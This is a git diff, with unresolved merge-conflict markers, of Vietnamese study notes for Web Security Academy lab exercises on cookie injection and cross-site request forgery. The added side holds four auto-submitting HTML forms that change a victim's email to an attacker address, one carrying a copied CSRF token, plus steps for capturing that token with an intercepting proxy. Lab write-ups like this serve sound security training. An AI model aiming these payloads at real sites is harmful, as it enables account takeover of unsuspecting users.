@@ -1,3 +1,4 @@
+<<<<<<< Updated upstream
 5: 
 
 Phân tích 1: Khi search ta thấy web có set thông tin search cũ vào 1 cookie, và nó có thể inject để thay đổi Cookie bằng Set-Cookie
@@ -99,4 +100,58 @@ Tại head Response của exploit server ta thêm Header:
 Referrer-Policy: unsafe-url 
 
 Bấm Deliver view to victim để hoàn thành bàig
+=======
+1: Cho phần này vào payload của sever exploit và bấm deliver to victim
+
+<html>
+    <body>
+        <form action="https://0ac70016033fe031c10f7b60005300ec.web-security-academy.net/my-account/change-email" method="POST">
+            <input type="hidden" name="email" value="pwned@evil-user.net" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
+
+2: <html>
+    <body>
+        <form action="https://0a17007a04c68913c1b1490d00060031.web-security-academy.net/my-account/change-email" method="PUT">
+            <input type="hidden" name="email" value="pwned@evil-user.net" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
+
+3: 
+
+<html>
+    <body>
+        <form action="https://0a88003b03898a94c0d72c3c00360083.web-security-academy.net/my-account/change-email" method="POST">
+            <input type="hidden" name="email" value="pwned@evil-user.net" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
+
+4:
+
+<html>
+    <body>
+        <form action="https://0adb0044045e41dec0a09be200b400be.web-security-academy.net/my-account/change-email" method="POST">
+            <input type="hidden" name="email" value="pwned@evil-user.net" />
+            <input type="hidden" name="csrf" value="xkld4j3NIQvcKNVp981VS8seDKQrzcIp" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
+
+đăng nhập ở web vào acc1 và acc2 ở chế độ ẩn danh. Ở acc1, bật intercept để bắt req POST /change-email, copy csrf và drop req. Ở trang ẩn danh, vào exploit server điền như trên với value của csrf là value vừa copy. Bấm deliver to victim
+>>>>>>> Stashed changes
 
